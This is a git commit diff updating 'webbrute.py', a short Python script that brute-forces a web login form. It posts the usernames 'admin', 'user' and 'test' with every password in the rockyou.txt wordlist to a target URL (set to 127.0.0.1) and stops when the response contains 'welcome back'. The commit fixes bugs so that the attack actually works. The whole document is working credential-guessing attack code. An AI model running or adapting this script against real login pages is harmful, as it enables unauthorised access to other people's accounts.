afb6af587e30974fe97934a2f19f2db3235a44c8
securerobbie <mrleyba01@protonmail.com>
2024-09-20 10:25:04 +0700

    Update webbrute.py

--- webbrute.py
+++ webbrute.py
@@ -2,21 +2,22 @@ import requests
 import sys
 
 target = "http://127.0.0.1"
-usernames = ["admin","user","test"]
+usernames = ["admin", "user", "test"]
 passwords = "rockyou.txt"
 needle = "welcome back"
 
 for user in usernames:
     with open(passwords, "r") as passwords_list:
         for password in passwords_list:
-            password = password.strip("\n").encode()
-            sys.stdout.write("[X] Attempting user:passowrd -> {}:{}\r".format(usernames, password.decode()))
+            password = password.strip("\n")
+            sys.stdout.write(f"[X] Attempting user:password -> {user}:{password}\r")
             sys.stdout.flush()
-            r = requests.post(target, data={"username": usernames, "password": password})
-            if needle.encode() in r.content:
+
+            r = requests.post(target, data={"username": user, "password": password})
+            
+            if needle in r.text:
                 sys.stdout.write("\n")
-                sys.stdout.write("\t [>>>>] Valid Password '{}' found for user '{}'!".format(password.decode(), usernames))
-                sys.exit()
-    sys.stdout.flush()
-    sys.stdout.write("\n")
-    sys.stdout.write("\tNo Password Found for '{}'!".format(usernames))
+                sys.stdout.write(f"\t [>>>>] Valid Password '{password}' found for user '{user}'!\n")
+                sys.exit()  # Exit after finding the correct username-password combo
+    
+    sys.stdout.write(f"\n\tNo Password Found for '{user}'!\n")
